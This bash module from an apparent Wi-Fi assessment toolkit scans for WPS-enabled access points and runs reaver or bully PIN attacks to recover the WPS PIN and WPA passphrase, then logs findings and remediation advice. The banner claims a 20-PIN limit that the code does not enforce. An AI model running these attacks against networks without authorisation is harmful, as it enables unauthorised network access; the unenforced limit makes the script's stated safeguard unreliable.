#!/usr/bin/env bash
# MODULE_META
# NAME="WPS PIN Attack"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="wash,reaver,bully"
# DESC="Scan for WPS-enabled APs and test PIN brute-force vulnerability"
# REQS="monitor_iface,target_ssid"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d3_wps_testing.sh
#  D3: WPS PIN Attack
#
#  PURPOSE:
#    Test if the target network has WPS (Wi-Fi Protected Setup) enabled.
#    If enabled, test WPS PIN brute-force vulnerability using reaver/bully.
#    WPS is a common attack vector even on WPA2-protected networks.
#
#  TOOLS: wash, reaver, bully, airmon-ng
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID/BSSID/channel)
#
#  EVIDENCE PRODUCED:
#    - d3_wps_scan.txt             (wash WPS scan results)
#    - d3_wps_attack.txt           (reaver/bully attack output)
#    - d3_findings.txt             (analysis summary)
#===============================================================================

set -uo pipefail

run_d3() {
    local total_steps=6
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d3"
    local findings_file="${evidence_prefix}_findings.txt"
    local wps_scan_file="${evidence_prefix}_wps_scan.txt"
    local attack_file="${evidence_prefix}_wps_attack.txt"

    #--- Step 1: Verify tools & prerequisites ---
    log_step 1 $total_steps "Verifying required tools and targets"
    update_tc_progress 1 $total_steps "Checking dependencies"

    check_module_dependencies "D3" || return 1

    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID})"

    local wps_enabled="false"
    local wps_locked="false"
    local wps_version=""
    local pin_recovered="false"
    local recovered_pin=""
    local psk_recovered="false"
    local recovered_psk=""

    {
        echo "============================================================"
        echo "  D3: WPS PIN Attack Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"
    log_success "Monitor mode active: ${mon_iface}"

    check_abort || return 1

    #--- Step 3: WPS scan with wash ---
    log_step 3 $total_steps "Scanning for WPS-enabled networks"
    update_tc_progress 3 $total_steps "WPS scan"

    {
        echo "============================================================"
        echo "  WPS Scan Results"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "============================================================"
        echo ""
    } > "$wps_scan_file"

    # Run wash for a scan
    log_info "Running 30s WPS scan..."
    local wash_output
    wash_output=$(timeout 30 "${TOOL_PATHS[wash]}" -i "$mon_iface" -s 2>/dev/null || true)

    echo "$wash_output" >> "$wps_scan_file"

    # Check if target AP has WPS enabled
    local target_wps_line
    target_wps_line=$(echo "$wash_output" | grep -i "${GUEST_BSSID}" || true)

    if [[ -n "$target_wps_line" ]]; then
        wps_enabled="true"
        log_result "FINDING" "WPS is ENABLED on ${GUEST_SSID} (${GUEST_BSSID})"
        echo "FINDING: WPS enabled on target network" >> "$findings_file"

        # Parse WPS version and lock status
        wps_version=$(echo "$target_wps_line" | awk '{print $4}' | xargs) || wps_version="unknown"
        local lock_status
        lock_status=$(echo "$target_wps_line" | awk '{print $5}' | xargs) || lock_status="no"

        if [[ "${lock_status,,}" == "yes" || "${lock_status,,}" == "locked" ]]; then
            wps_locked="true"
            log_info "WPS is currently LOCKED (rate limiting active)"
            echo "INFO: WPS is locked (rate limiting)" >> "$findings_file"
        fi

        echo "WPS Version: ${wps_version}" >> "$findings_file"
        echo "WPS Locked: ${wps_locked}" >> "$findings_file"
        echo "Full scan line: ${target_wps_line}" >> "$findings_file"
    else
        log_info "WPS does NOT appear to be enabled on ${GUEST_SSID}"
        echo "INFO: WPS not detected on target network" >> "$findings_file"
    fi

    local wps_ap_count
    wps_ap_count=$(echo "$wash_output" | grep -c '[0-9A-Fa-f]\{2\}:' 2>/dev/null || echo "0")
    log_info "Total WPS-enabled APs in range: ${wps_ap_count}"

    check_abort || return 1

    #--- Step 4: WPS PIN attack (if enabled and not locked) ---
    log_step 4 $total_steps "WPS PIN brute-force attempt"
    update_tc_progress 4 $total_steps "PIN attack"

    if [[ "$wps_enabled" == "true" && "$wps_locked" == "false" ]]; then
        echo ""
        echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
        echo "  ╔════════════════════════════════════════════════════════════════════╗"
        echo "  ║  ★ WPS PIN BRUTE-FORCE ★                                        ║"
        echo "  ║                                                                    ║"
        echo "  ║  WPS is enabled on the target. Attempting limited PIN attack       ║"
        echo "  ║  (max 20 PINs to avoid permanent lockout).                        ║"
        echo "  ║                                                                    ║"
        echo "  ║  This may trigger WPS lockout on the target AP.                   ║"
        echo "  ╚════════════════════════════════════════════════════════════════════╝"
        echo -e "${C_RESET}"
        echo ""
        get_or_request_param "confirm" "  Proceed with limited WPS PIN attack? [Y/n]"
        if [[ "${confirm,,}" == "n" ]]; then
            log_info "WPS PIN attack skipped by user"
            echo "SKIPPED: WPS PIN attack skipped by user" >> "$findings_file"
        else
            {
                echo "============================================================"
                echo "  WPS PIN Attack Results"
                echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
                echo "============================================================"
                echo ""
            } > "$attack_file"

            if [[ -x "${TOOL_PATHS[reaver]}" ]]; then
                log_info "Starting reaver Pixie-Dust attack..."
                local reaver_output
                reaver_output=$(timeout 180 "${TOOL_PATHS[reaver]}" \
                    -i "$mon_iface" \
                    -b "$GUEST_BSSID" \
                    -c "${GUEST_CHANNEL:-0}" \
                    -vv -K \
                    2>&1 || true)

                echo "$reaver_output" >> "$attack_file"

                # Check for PIN
                local found_pin
                found_pin=$(echo "$reaver_output" | grep -i "WPS PIN:" | awk -F: '{print $NF}' | xargs) || true
                if [[ -n "$found_pin" ]]; then
                    pin_recovered="true"
                    recovered_pin="$found_pin"
                    log_result "CRITICAL" "★ WPS PIN recovered: ${recovered_pin}"
                    echo "CRITICAL: WPS PIN recovered: ${recovered_pin}" >> "$findings_file"
                fi

                # Check for PSK
                local found_psk
                found_psk=$(echo "$reaver_output" | grep -i "WPA PSK:" | awk -F: '{print $NF}' | xargs) || true
                if [[ -n "$found_psk" ]]; then
                    psk_recovered="true"
                    recovered_psk="$found_psk"
                    log_result "CRITICAL" "★ WPA PSK recovered via WPS: ${recovered_psk}"
                    echo "CRITICAL: WPA PSK recovered via WPS: ${recovered_psk}" >> "$findings_file"
                fi

            elif [[ -x "${TOOL_PATHS[bully]}" ]]; then
                log_info "Starting bully attack..."
                local bully_output
                bully_output=$(timeout 180 "${TOOL_PATHS[bully]}" "$mon_iface" \
                    -b "$GUEST_BSSID" \
                    -c "${GUEST_CHANNEL:-0}" \
                    -d -v 3 \
                    2>&1 || true)

                echo "$bully_output" >> "$attack_file"

                local found_pin
                found_pin=$(echo "$bully_output" | grep -i "pin:" | tail -1 | awk -F: '{print $NF}' | xargs) || true
                if [[ -n "$found_pin" ]]; then
                    pin_recovered="true"
                    recovered_pin="$found_pin"
                    log_result "CRITICAL" "★ WPS PIN recovered: ${recovered_pin}"
                fi
            else
                 log_warn "Neither reaver nor bully found for attack"
            fi
        fi
    elif [[ "$wps_enabled" == "true" && "$wps_locked" == "true" ]]; then
        log_info "WPS is locked — skipping PIN attack to avoid permanent lockout"
        echo "INFO: WPS locked, PIN attack skipped" >> "$findings_file"
    else
        log_info "WPS not enabled — no PIN attack needed"
    fi

    #--- Step 5: Restore managed mode ---
    log_step 5 $total_steps "Restoring managed mode"
    update_tc_progress 5 $total_steps "Cleanup"

    disable_monitor_mode
    sleep 3

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$psk_recovered" == "true" ]]; then
        result_status="CRITICAL"
        result_summary="CRITICAL: WPA PSK recovered via WPS PIN attack! PIN: ${recovered_pin}, PSK: ${recovered_psk}."
        recommendations="1) Disable WPS on all APs immediately. 2) Rotate the WPA PSK. 3) Move to WPA3-SAE."
    elif [[ "$pin_recovered" == "true" ]]; then
        result_status="CRITICAL"
        result_summary="CRITICAL: WPS PIN recovered (${recovered_pin}). PSK extraction is possible."
        recommendations="1) Disable WPS immediately. 2) WPS PIN recovery allows full PSK compromise."
    elif [[ "$wps_enabled" == "true" ]]; then
        result_status="FINDING"
        result_summary="WPS is enabled on the target network, presenting a significant attack surface."
        recommendations="1) Disable WPS on all APs. 2) If WPS is required, use PBC mode only with strict lockout."
    else
        result_summary="WPS is not enabled on the target network. No WPS attack surface detected."
        recommendations="No action needed. WPS is properly disabled."
    fi

    evidence_register_file "$wps_scan_file"
    [[ -f "$attack_file" ]] && evidence_register_file "$attack_file"
    evidence_register_file "$findings_file"

    local result_json
    result_json=$(run_fg "jq" -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "WPS: ${wps_enabled}, Locked: ${wps_locked}, Version: ${wps_version:-unknown}, PIN: ${pin_recovered}, PSK: ${psk_recovered}" \
        --arg recommendations "$recommendations" \
        --arg wps_enabled "$wps_enabled" \
        --arg wps_locked "$wps_locked" \
        --arg wps_version "${wps_version:-unknown}" \
        --arg pin_recovered "$pin_recovered" \
        --arg recovered_pin "$recovered_pin" \
        --arg psk_recovered "$psk_recovered" \
        --arg recovered_psk "$recovered_psk" \
        --argjson wps_aps_in_range "${wps_ap_count:-0}" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            wps_enabled: ($wps_enabled == "true"),
            wps_locked: ($wps_locked == "true"),
            wps_version: $wps_version,
            pin_recovered: ($pin_recovered == "true"),
            recovered_pin: $recovered_pin,
            psk_recovered: ($psk_recovered == "true"),
            recovered_psk: $recovered_psk,
            wps_aps_in_range: $wps_aps_in_range
        }')

    # 11 Flags: pcap_req, has_tool, has_pri, has_cmd, has_ver, has_env, has_conf, has_known, runtime, clean, secure
    local has_pri=0
    [[ "$pin_recovered" == "true" || "$psk_recovered" == "true" ]] && has_pri=1
    local is_secure=0
    [[ "$result_status" == "SECURE" ]] && is_secure=1

    save_tc_result "D3" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 $is_secure
    save_session_state

    return 0
}
